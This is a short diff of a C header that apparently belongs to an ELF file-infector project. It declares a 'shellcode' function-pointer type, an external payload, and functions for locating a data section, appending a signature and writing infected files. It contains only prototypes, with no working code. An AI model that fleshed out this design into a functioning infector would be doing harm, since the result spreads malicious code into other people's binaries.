@@ -22,7 +22,7 @@ struct  bfile {
   Elf64_Ehdr  *header;
 };
 
-typedef int (*shellcode)(void *(*dlsym)(void *, const char *), void *handle, struct bfile *file, const char *dirname,  const char *filename, const char *payload);
+typedef int (*shellcode)(void *(*dlsym)(void *, const char *), void *handle, const char *dirname,  const char *filename, const char *payload);
 
 extern const char *payload;
 
@@ -32,8 +32,6 @@ int         checkProcess(void);
 Elf64_Shdr   *getDataSectionHeader(Elf64_Ehdr *header);
 int         appendSignature(struct bfile file, size_t offset);
 
-int         isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine);
-int         mapFile(const char *firname, const char *filename, struct bfile *file);
 int         writeToFile(const char *dirname, const char *filename, struct bfile header);
 
 shellcode   getSymbol(Elf64_Ehdr *header);
